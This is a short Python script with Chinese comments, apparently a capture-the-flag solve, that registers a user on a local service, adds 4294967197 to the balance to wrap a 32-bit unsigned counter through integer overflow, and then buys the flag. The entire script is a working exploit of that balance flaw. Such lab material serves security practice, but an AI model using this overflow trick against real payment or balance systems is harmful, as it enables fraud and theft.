import requests

# 服务器地址
base_url = "http://localhost:8002"

# 注册用户并获取 user_id
response = requests.post(f"{base_url}/register")
user_id = response.json()['user_id']
print(f"Registered user ID: {user_id}")

# 定义增加余额的函数
def add_balance(user_id, amount):
    response = requests.post(f"{base_url}/add_balance", data={"user_id": user_id, "amount": str(amount)})
    print(response.text)

# 定义购买 flag 的函数
def buy_flag(user_id):
    response = requests.post(f"{base_url}/buy_flag", data={"user_id": user_id})
    print(response.text)

# 增加的金额，使其触发 u32 的整数溢出
add_amounts = [4294967197]  # 添加使其余额变为1元的金额

# 增加余额
for amount in add_amounts:
    add_balance(user_id, amount)

# 尝试购买 flag
buy_flag(user_id)